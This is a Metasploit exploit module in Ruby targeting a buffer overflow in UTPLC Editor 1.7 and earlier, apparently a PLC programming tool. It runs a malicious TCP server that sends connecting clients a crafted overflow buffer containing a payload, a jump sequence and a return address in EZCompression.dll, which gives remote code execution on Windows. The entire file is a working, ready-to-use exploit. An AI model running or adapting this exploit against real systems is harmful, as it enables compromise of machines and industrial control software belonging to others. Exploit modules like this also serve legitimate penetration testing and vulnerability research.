class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::TcpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'UTPLC Editor Buffer Overflow',
      'Description'    => %q{
        This module exploits a buffer overflow in UTPLC Editor. This vulnerability
        affects versions 1.7 and earlier.
      },
      'Author'         => ['mario ceballos'],
      'License'        => 'BSD_LICENSE',
      'References'     =>
        [
          [ 'URL', 'http://www.uticor.net/download.htm' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 500,
          'BadChars' => "\x00\x20\x0a",
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'UTPLC Editor 1.7', { 'Ret' => 0x10006462 } ], # EZCompression.dll 
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Dec 23 2020',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The daemon port to listen on", 49999 ])
      ])
  end

  def on_client_data(client)
    return if ((p = regenerate_payload(client)) == nil)

    nops = "\x96" * 16

    buffer = rand_text_alpha_upper(2024)
    buffer[4, payload.encoded.size] = payload.encoded
    buffer[1004, 4] = [0x969610eb].pack('V')
    buffer[1008, 4] = [target.ret].pack('V')
    buffer[1012, nops.size + 5] = nops + [0xe9, -1025].pack('CV')
 
    res = client.get_once
     
    client.put(buffer)
    handler

    service.close_client(client)
  end
end
